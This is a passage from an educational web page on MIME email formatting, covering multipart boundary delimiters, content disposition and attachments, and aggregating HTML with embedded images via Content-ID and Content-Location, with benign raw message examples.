<a href="#tool-protocol-esmtp&amp;content=multipart%2Falternative&amp;body=--UniqueBoundary%0AContent-Type%3A+text%2Fplain%0A%0ARoses+are+red.%0A%0A--UniqueBoundary%0AContent-Type%3A+text%2Fenriched%0A%0A%3Cbold%3ERoses%3C%2Fbold%3E+%3Citalic%3Eare%3C%2Fitalic%3E%0A%3Ccolor%3E%3Cparam%3Ered%3C%2Fparam%3Ered%3C%2Fcolor%3E.%0A%0A--UniqueBoundary%0AContent-Type%3A+text%2Fhtml%0A%0A%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Cb%3ERoses%3C%2Fb%3E+%3Ci%3Eare%3C%2Fi%3E%0A++++%3Cspan+style%3D%22color%3Ared%3B%22%3Ered%3C%2Fspan%3E.%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this multipart/alternative example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.

</figcaption>
    </figure>
  </li>
</ul>

<p>Since <code>multipart/mixed</code> and <code>multipart/alternative</code> are content types like any other, they can be nested,
which results in a <a href="https://en.wikipedia.org/wiki/Tree_(graph_theory)">tree</a> of message parts.
The <a href="#content-encoding">content encoding</a> of <code>multipart</code> parts
<a href="https://datatracker.ietf.org/doc/html/rfc2045#section-6.4">has to be</a> <code>7bit</code>, <code>8bit</code>, or <code>binary</code>,
and the <a href="#boundary-delimiter">boundary</a> between the inner parts
has to be different from the boundary between the outer parts.</p>

<details>
  <summary id="boundary-delimiter">
Boundary delimiter
</summary>

  <p>For all subtypes of the <code>multipart</code> <a href="#content-type">content type</a>,
the sender has to provide a <code>boundary</code> value;
there’s no default value for this parameter.
As mentioned <a href="#internationalized-parameter-values">earlier</a>,
the double quotes are not part of the value and
are required only if the value contains <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5.1">certain characters</a>.
The <code>boundary</code> value has to consist of <a href="https://datatracker.ietf.org/doc/html/rfc2046#page-20">1 to 70 <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters</a>,
and it may not end with <a href="https://en.wikipedia.org/wiki/Whitespace_character">whitespace</a>.
Unlike other parameter values, multipart boundaries <a href="https://datatracker.ietf.org/doc/html/rfc2045#page-13">are case-sensitive</a>.
The various parts are then separated by two hyphens
followed by the <code>boundary</code> value and optional whitespace on a line of their own.
The <a href="#newline-characters">newline characters <abbr title="Carriage Return (first newline character)">CR</abbr>+<abbr title="Line Feed (second newline character)">LF</abbr></a> which start and end
the <a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1.1">boundary delimiter line</a> belong to the delimiter.
As a consequence, the preceding content has no trailing newline characters
if there’s no empty line between the content and the boundary delimiter line.
<a href="https://datatracker.ietf.org/doc/html/rfc2046#page-22">More formally</a>,
the various parts are separated by <code>{CR}{LF}--{BoundaryValue}{OptionalWhitespace}{CR}{LF}</code>.
The same line without the leading <code>{CR}{LF}</code> is used to mark the beginning of the first part,
and the same line with two hyphens inserted after the <code>BoundaryValue</code> is used to mark the end of the last part.
(If the first line required the leading <code>{CR}{LF}</code>, then the above examples would be wrong
because the empty line is used to <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.5">separate the header from the body</a>
and the content itself therefore starts with <code>--UniqueBoundary{CR}{LF}</code>.)
Any text before the first part belongs to the preamble and
any text after the last part belongs to the epilogue of the <code>multipart</code> content.
Both the preamble and the epilogue are ignored by clients which support <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>.
Historically, the preamble was used to inform users of clients without <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> support
that the rest of the body is a multipart message.
Nowadays, the preamble and the epilogue are best used
to leave a note to users who know how to inspect the <a href="#raw-message">raw message</a>. 😉</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&#34;UniqueBoundary&#34;

Preamble, which is ignored by MIME-supporting clients.

--UniqueBoundary

Part 1 with an implicit content type of text/plain.

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii

Part 2 with an explicit content type of text/plain.

--UniqueBoundary--

Epilogue, which is ignored by MIME-supporting clients.
</code></pre></div>    </div>

    <figcaption>

The various parts of a  <code>multipart</code> message.
<a href="#tool-protocol-esmtp&amp;content=multipart%2Fmixed&amp;body=Preamble%2C+which+is+ignored+by+MIME-supporting+clients.%0A%0A--UniqueBoundary%0A%0APart+1+with+an+implicit+content+type+of+text%2Fplain.%0A%0A--UniqueBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0APart+2+with+an+explicit+content+type+of+text%2Fplain.%0A%0A--UniqueBoundary--%0A%0AEpilogue%2C+which+is+ignored+by+MIME-supporting+clients." title="Set the body of the ESMTP tool to this boundary example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.

</figcaption>
  </figure>

  <p>Each part starts with zero or more <code>Content-*</code> header fields followed by an empty line and the content of that part.
The sending mail client has to make sure that the boundary delimiter line doesn’t appear in the embedded content.
Due to the leading two hyphens, the delimiter cannot appear in <a href="#content-encoding">Base64-encoded content</a>.
By including <code>=_</code> in the <code>boundary</code> value,
the delimiter also cannot appear in <a href="#content-encoding">Quoted-Printable-encoded content</a>.
The rest of the <code>boundary</code> value is usually chosen randomly.
Apple Mail, for example, chooses <code>Apple-Mail=_</code> followed by a
<a href="#universally-unique-identifier">universally unique identifier (<abbr title="Universally Unique Identifier">UUID</abbr>)</a> as the <code>boundary</code> value.</p>

</details>

<details>
  <summary id="content-disposition">
Content disposition
</summary>

  <p>If the example from the <a href="#boundary-delimiter">previous box</a> is not blocked by your spam filter,
your mail client likely displays the content of the second part below the content of the first part.
If you want some parts of a message to be displayed as a file,
which the user has to open to see its content,
you can indicate this with <code>Content-Disposition: attachment</code>.
The <code>Content-Disposition</code> header field is specified in <a href="https://datatracker.ietf.org/doc/html/rfc2183"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2183</a>.
Besides asking mail clients to display a <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part as an <a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.2"><code>attachment</code></a>,
you can also ask them to display its content <a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.1"><code>inline</code></a>,
i.e. visible between the other parts.
With the <a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.3"><code>filename</code> parameter</a>,
the sender can suggest a filename for when the recipient wants to store the part in a separate file.
If the filename includes non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters,
it has to be encoded with the <a href="#internationalized-parameter-values">Extended-Parameter encoding</a>.
The receiving mail client should make sure that the filename conforms to local filesystem conventions
and that no file is overwritten without user consent when saving the attachment.
The receiving mail client should also ignore any
<a href="https://en.wikipedia.org/wiki/Path_(computing)">path delimiters</a> in the filename.
Let’s look at an example:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii

Hello, I&#39;ve attached the source code of the exercise.

--UniqueBoundary
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=HelloWorld.c

#include &lt;stdio.h&gt;

int main() {
  printf(&#34;Hello, World!&#34;);
  return 0;
}

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

How to attach a file with a name.
<a href="#tool-protocol-esmtp&amp;content=multipart%2Fmixed&amp;body=--UniqueBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0AHello%2C+I%27ve+attached+the+source+code+of+the+exercise.%0A%0A--UniqueBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0AContent-Disposition%3A+attachment%3B+filename%3DHelloWorld.c%0A%0A%23include+%3Cstdio.h%3E%0A%0Aint+main%28%29+%7B%0A++printf%28%22Hello%2C+World%21%22%29%3B%0A++return+0%3B%0A%7D%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this attachment example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.

</figcaption>
  </figure>

  <p>For <a href="https://mailarchive.ietf.org/arch/msg/ietf-smtp/KtN0TdoHDayKvKycNbsFD-GB-e4/">historical reasons</a>,
many mail clients also include the filename with the <code>name</code> parameter in the <code>Content-Type</code> header field.
If the filename contains non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters, they use the <a href="#header-encoding">Encoded-Word encoding</a> there
contrary to what <a href="https://datatracker.ietf.org/doc/html/rfc2231#section-4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2231</a> specifies.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc2183"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2183</a> specifies additional parameters,
which are less commonly used:
<a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.4"><code>creation-date</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.5"><code>modification-date</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.6"><code>read-date</code></a>,
and <a href="https://datatracker.ietf.org/doc/html/rfc2183#section-2.7"><code>size</code></a>,
where the size is provided in bytes and the dates are formatted according to
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> just like the <code>Date</code> header field.</p>

</details>

<details>
  <summary id="aggregate-documents">
Aggregate documents
</summary>

  <p>Certain content types, such as <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr></a>,
can reference external resources, such as styles and images.
If the external resources are not attached to the message,
your mail client has to fetch them over the Internet
in order to display the message as intended by the sender.
However, <a href="#remote-content">remote content</a> compromises your privacy
and violates the principle that the sender of a message
can no longer affect its content once it has arrived in your inbox.
These issues can be avoided by attaching all the referenced resources to the message
and then referencing these attachments from the main part.
The following three standards allow us to do this:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc2387"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2387</a> specifies the <code>multipart/related</code> <a href="#content-type">content type</a>,
which indicates that the various parts are related to one another and should be rendered as a whole.
Unless declared otherwise with the <a href="https://datatracker.ietf.org/doc/html/rfc2387#section-3.2"><code>start</code> parameter</a>,
the main part, which references the other documents, is the first part of the <code>multipart/related</code> content.
The <a href="https://datatracker.ietf.org/doc/html/rfc2387#section-3.1"><code>type</code> parameter</a>
has to be set to the content type of the main part.
The <a href="#content-disposition">content disposition</a> of the other parts is
<a href="https://datatracker.ietf.org/doc/html/rfc2387#section-4">relevant only</a> for mail clients
which don’t recognize the <code>multipart/related</code> content type and render the parts as <code>multipart/mixed</code>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc2045#section-7"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2045</a> specifies the <code>Content-ID</code> header field
to identify the parts of a multipart message.
The syntax of the <a href="#message-identification"><code>Message-ID</code> header field</a> is used for the <code>Content-ID</code> header field,
and just like the <code>Message-ID</code>, each <code>Content-ID</code> has to be generated in such a way that it is globally unique.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc2557"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2557</a> specifies two ways how other <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> parts can be referenced from <abbr title="HyperText Markup Language">HTML</abbr>.
The first way is to use <code>cid</code> as the <a href="https://en.wikipedia.org/wiki/URL#Syntax">scheme name</a>
of <a href="https://en.wikipedia.org/wiki/URL">Uniform Resource Locators (<abbr title="Uniform Resource Locators (the formal name for web addresses)">URLs</abbr>)</a>
to refer to the <code>Content-ID</code> of another part.
The disadvantage of this approach is that the <abbr title="Uniform Resource Locators (the formal name for web addresses)">URLs</abbr> of an existing <abbr title="HyperText Markup Language">HTML</abbr> page have to be rewritten.
For this reason, the second way leaves the <abbr title="HyperText Markup Language">HTML</abbr> page as is and introduces a
<a href="https://datatracker.ietf.org/doc/html/rfc2557#section-4"><code>Content-Location</code> header field</a> instead.
This header field can be used in a referenced part with the <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> that is used to reference it in the main part.
The <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> should be globally unique, but it doesn’t have to resolve to a document,
and it may even resolve to a completely different document.
What makes the second approach a bit more complicated is the potentially required
<a href="https://datatracker.ietf.org/doc/html/rfc2557#section-4.4">encoding of the <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr></a>
and how <a href="https://datatracker.ietf.org/doc/html/rfc2557#section-5">relative <abbr title="Uniform Resource Locators (the formal name for web addresses)">URLs</abbr> are resolved</a>.
The resulting <code>multipart/related</code> format,
which is called <a href="https://en.wikipedia.org/wiki/MHTML"><abbr title="MIME encapsulation of aggregate HTML documents">MHTML</abbr></a>,
is also used to <a href="https://en.wikipedia.org/wiki/Web_archiving">archive websites</a> independently from email.</li>
  </ul>

  <p>You can find <a href="https://datatracker.ietf.org/doc/html/rfc2557#section-9">plenty of examples</a>
with <a href="https://www.rfc-editor.org/errata_search.php?rfc=2557">plenty of errors</a>
in <a href="https://datatracker.ietf.org/doc/html/rfc2557"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2557</a>.
Here is an example of my own:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/related; boundary=&#34;UniqueBoundary&#34;; type=&#34;multipart/alternative&#34;

--UniqueBoundary
Content-Type: multipart/alternative; boundary=&#34;InnerBoundary&#34;

--InnerBoundary
Content-Type: text/plain; charset=us-ascii

https://ef1p.com

--InnerBoundary
Content-Type: text/html; charset=us-ascii

&lt;html&gt;
  &lt;body&gt;
    &lt;a href=&#34;https://ef1p.com&#34; style=&#34;text-decoration: none; font-weight: bold; color: #0D4073;&#34;&gt;
      &lt;img src=&#34;cid:logo@ef1p.com&#34; style=&#34;vertical-align: middle;&#34;&gt; ef1p.com
    &lt;/a&gt;
  &lt;/body&gt;
&lt;/html&gt;

--InnerBoundary--

--UniqueBoundary
Content-Type: image/png
Content-ID: &lt;logo@ef1p.com&gt;
Content-Transfer-Encoding: base64
Content-Disposition: inline; filename=logo.png

iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL
EgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH+BhBP/UEAxKv/AN3jG
/1ATPeqlJr169WRpi/NmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW
gkR02KvDFj4+hxMCpUq5T4h1d7LU3Zulbo+X5GQBGToC2XzC1vML1lmtPGMiciQ5
I/xgBRmtBSFHpPS+0O0rRzzz/JWf5kxf3CKSQneusea8whGyjbIQ4kI+lMHHkTou
TpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI+HxvZvfIeem9wihKhO09EKWuG
D4KDC4WKITpJAUbnQnREugOR3+RjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff
YlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId
rvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC+Hkp7ytKwFU2w29CKK1Wk70e0seN
8otSpW0+CO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs/xqrGrXb2xmzqx6Jpik6IX
Jbq+8i90heGQs+zvwXZzOFQdX+7ess5EmZ2Nk7/ja/+AHXkDdiQDduLObPeA3fEL
mMvYTwWJ6Hb+An4Bgrjq/fe5+zgAAAAASUVORK5CYII=

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

<code>&lt;img src=&#34;cid:logo@ef1p.com&#34;&gt;</code> references the part with <code>Content-ID: &lt;logo@ef1p.com&gt;</code>.
<a href="#tool-protocol-esmtp&amp;content=multipart%2Frelated&amp;body=--UniqueBoundary%0AContent-Type%3A+multipart%2Falternative%3B+boundary%3D%22InnerBoundary%22%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0Ahttps%3A%2F%2Fef1p.com%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dus-ascii%0A%0A%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Ca+href%3D%22https%3A%2F%2Fef1p.com%22+style%3D%22text-decoration%3A+none%3B+font-weight%3A+bold%3B+color%3A+%230D4073%3B%22%3E%0A++++++%3Cimg+src%3D%22cid%3Alogo%40ef1p.com%22+style%3D%22vertical-align%3A+middle%3B%22%3E+ef1p.com%0A++++%3C%2Fa%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A--InnerBoundary--%0A%0A--UniqueBoundary%0AContent-Type%3A+image%2Fpng%0AContent-ID%3A+%3Clogo%40ef1p.com%3E%0AContent-Transfer-Encoding%3A+base64%0AContent-Disposition%3A+inline%3B+filename%3Dlogo.png%0A%0AiVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL%0AEgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH%2BBhBP%2FUEAxKv%2FAN3jG%0A%2F1ATPeqlJr169WRpi%2FNmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW%0AgkR02KvDFj4%2BhxMCpUq5T4h1d7LU3Zulbo%2BX5GQBGToC2XzC1vML1lmtPGMiciQ5%0AI%2FxgBRmtBSFHpPS%2B0O0rRzzz%2FJWf5kxf3CKSQneusea8whGyjbIQ4kI%2BlMHHkTou%0ATpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI%2BHxvZvfIeem9wihKhO09EKWuG%0AD4KDC4WKITpJAUbnQnREugOR3%2BRjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff%0AYlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId%0ArvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC%2BHkp7ytKwFU2w29CKK1Wk70e0seN%0A8otSpW0%2BCO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs%2FxqrGrXb2xmzqx6Jpik6IX%0AJbq%2B8i90heGQs%2BzvwXZzOFQdX%2B7ess5EmZ2Nk7%2Fja%2F%2BAHXkDdiQDduLObPeA3fEL%0AmMvYTwWJ6Hb%2BAn4Bgrjq%2Ffe5%2BzgAAAAASUVORK5CYII%3D%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this aggregation example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.

</figcaption>
  </figure>

  <p>The parts can also be aggregated differently.
Click on the list title to use the corresponding variant in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.</p>
  <ul>
    <li><a href="#tool-protocol-esmtp&amp;content=multipart%2Frelated&amp;body=--UniqueBoundary%0AContent-Type%3A+multipart%2Falternative%3B+boundary%3D%22InnerBoundary%22%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0Ahttps%3A%2F%2Fef1p.com%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dus-ascii%0A%0A%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Ca+href%3D%22https%3A%2F%2Fef1p.com%22+style%3D%22text-decoration%3A+none%3B+font-weight%3A+bold%3B+color%3A+%230D4073%3B%22%3E%0A++++++%3Cimg+src%3D%22logo.png%22+style%3D%22vertical-align%3A+middle%3B%22%3E+ef1p.com%0A++++%3C%2Fa%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A--InnerBoundary--%0A%0A--UniqueBoundary%0AContent-Type%3A+image%2Fpng%0AContent-Location%3A+logo.png%0AContent-Transfer-Encoding%3A+base64%0AContent-Disposition%3A+inline%3B+filename%3Dlogo.png%0A%0AiVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL%0AEgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH%2BBhBP%2FUEAxKv%2FAN3jG%0A%2F1ATPeqlJr169WRpi%2FNmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW%0AgkR02KvDFj4%2BhxMCpUq5T4h1d7LU3Zulbo%2BX5GQBGToC2XzC1vML1lmtPGMiciQ5%0AI%2FxgBRmtBSFHpPS%2B0O0rRzzz%2FJWf5kxf3CKSQneusea8whGyjbIQ4kI%2BlMHHkTou%0ATpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI%2BHxvZvfIeem9wihKhO09EKWuG%0AD4KDC4WKITpJAUbnQnREugOR3%2BRjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff%0AYlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId%0ArvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC%2BHkp7ytKwFU2w29CKK1Wk70e0seN%0A8otSpW0%2BCO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs%2FxqrGrXb2xmzqx6Jpik6IX%0AJbq%2B8i90heGQs%2BzvwXZzOFQdX%2B7ess5EmZ2Nk7%2Fja%2F%2BAHXkDdiQDduLObPeA3fEL%0AmMvYTwWJ6Hb%2BAn4Bgrjq%2Ffe5%2BzgAAAAASUVORK5CYII%3D%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this content-location example."><strong>Relative <code>Content-Location</code></strong></a>:
Use <code>&lt;img src=&#34;logo.png&#34;&gt;</code> in the <abbr title="HyperText Markup Language">HTML</abbr> part and <code>Content-Location: logo.png</code> in the image part.
Apple Mail, Outlook.com, and Yahoo Mail fail to display the message correctly.
Only Gmail and Thunderbird implement this part of the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr>.</li>
    <li><a href="#tool-protocol-esmtp&amp;content=multipart%2Frelated&amp;body=--UniqueBoundary%0AContent-Type%3A+multipart%2Falternative%3B+boundary%3D%22InnerBoundary%22%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0Ahttps%3A%2F%2Fef1p.com%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dus-ascii%0A%0A%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Ca+href%3D%22https%3A%2F%2Fef1p.com%22+style%3D%22text-decoration%3A+none%3B+font-weight%3A+bold%3B+color%3A+%230D4073%3B%22%3E%0A++++++%3Cimg+src%3D%22https%3A%2F%2Fef1p.com%2Flogo.png%22+style%3D%22vertical-align%3A+middle%3B%22%3E+ef1p.com%0A++++%3C%2Fa%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A--InnerBoundary--%0A%0A--UniqueBoundary%0AContent-Type%3A+image%2Fpng%0AContent-Transfer-Encoding%3A+base64%0AContent-Location%3A+https%3A%2F%2Fef1p.com%2Flogo.png%0AContent-Disposition%3A+inline%3B+filename%3Dlogo.png%0A%0AiVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL%0AEgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH%2BBhBP%2FUEAxKv%2FAN3jG%0A%2F1ATPeqlJr169WRpi%2FNmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW%0AgkR02KvDFj4%2BhxMCpUq5T4h1d7LU3Zulbo%2BX5GQBGToC2XzC1vML1lmtPGMiciQ5%0AI%2FxgBRmtBSFHpPS%2B0O0rRzzz%2FJWf5kxf3CKSQneusea8whGyjbIQ4kI%2BlMHHkTou%0ATpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI%2BHxvZvfIeem9wihKhO09EKWuG%0AD4KDC4WKITpJAUbnQnREugOR3%2BRjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff%0AYlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId%0ArvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC%2BHkp7ytKwFU2w29CKK1Wk70e0seN%0A8otSpW0%2BCO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs%2FxqrGrXb2xmzqx6Jpik6IX%0AJbq%2B8i90heGQs%2BzvwXZzOFQdX%2B7ess5EmZ2Nk7%2Fja%2F%2BAHXkDdiQDduLObPeA3fEL%0AmMvYTwWJ6Hb%2BAn4Bgrjq%2Ffe5%2BzgAAAAASUVORK5CYII%3D%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this content-location example."><strong>Absolute <code>Content-Location</code></strong></a>:
Use <code>&lt;img src=&#34;https://ef1p.com/logo.png&#34;&gt;</code> in the <abbr title="HyperText Markup Language">HTML</abbr> part
and <code>Content-Location: https://ef1p.com/logo.png</code> in the image part.
Only the same mail clients as before display the message correctly.</li>
    <li><a href="#tool-protocol-esmtp&amp;content=multipart%2Falternative&amp;body=--UniqueBoundary%0AContent-Type%3A+text%2Fplain%3B+charset%3Dus-ascii%0A%0Ahttps%3A%2F%2Fef1p.com%0A%0A--UniqueBoundary%0AContent-Type%3A+multipart%2Frelated%3B+boundary%3D%22InnerBoundary%22%3B+type%3D%22text%2Fhtml%22%0A%0A--InnerBoundary%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dus-ascii%0A%0A%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Ca+href%3D%22https%3A%2F%2Fef1p.com%22+style%3D%22text-decoration%3A+none%3B+font-weight%3A+bold%3B+color%3A+%230D4073%3B%22%3E%0A++++++%3Cimg+src%3D%22cid%3Alogo%40ef1p.com%22+style%3D%22vertical-align%3A+middle%3B%22%3E+ef1p.com%0A++++%3C%2Fa%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A--InnerBoundary%0AContent-Type%3A+image%2Fpng%0AContent-ID%3A+%3Clogo%40ef1p.com%3E%0AContent-Transfer-Encoding%3A+base64%0AContent-Disposition%3A+inline%3B+filename%3Dlogo.png%0A%0AiVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL%0AEgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH%2BBhBP%2FUEAxKv%2FAN3jG%0A%2F1ATPeqlJr169WRpi%2FNmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW%0AgkR02KvDFj4%2BhxMCpUq5T4h1d7LU3Zulbo%2BX5GQBGToC2XzC1vML1lmtPGMiciQ5%0AI%2FxgBRmtBSFHpPS%2B0O0rRzzz%2FJWf5kxf3CKSQneusea8whGyjbIQ4kI%2BlMHHkTou%0ATpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI%2BHxvZvfIeem9wihKhO09EKWuG%0AD4KDC4WKITpJAUbnQnREugOR3%2BRjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff%0AYlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId%0ArvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC%2BHkp7ytKwFU2w29CKK1Wk70e0seN%0A8otSpW0%2BCO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs%2FxqrGrXb2xmzqx6Jpik6IX%0AJbq%2B8i90heGQs%2BzvwXZzOFQdX%2B7ess5EmZ2Nk7%2Fja%2F%2BAHXkDdiQDduLObPeA3fEL%0AmMvYTwWJ6Hb%2BAn4Bgrjq%2Ffe5%2BzgAAAAASUVORK5CYII%3D%0A%0A--InnerBoundary--%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this nesting example."><strong>Nesting <code>related</code> in <code>alternative</code></strong></a>:
Instead of nesting the parts as <code>related(alternative(Plain, HTML), Image)</code>,
you can also nest the parts as <code>alternative(Plain, related(HTML, Image)</code>.
The mail clients that I tested display the two variants identically.
For example, when telling Thunderbird to display the plaintext part,
it offered to save the attached image in both cases.
As far as I can tell, nesting <code>multipart/alternative</code> in <code>multipart/related</code> is more common.
This structure is also mentioned in <a href="https://datatracker.ietf.org/doc/html/rfc2557#section-7"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2557</a>,
and the second variant doesn’t even make it through <a href="https://postmaster.gandi.net/">Gandi’s spam filters</a>.</li>
  </ul>

</details>

<details>
  <summary id="other-multipart-subtypes">
Other multipart subtypes
</summary>

  <p>There are other multipart types for emails besides
<code>multipart/mixed</code>, <code>multipart/alternative</code>, and <code>multipart/related</code>:</p>
  <ul>
    <li><code>multipart/digest</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1.5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2046</a>):
Include several messages in a single message,
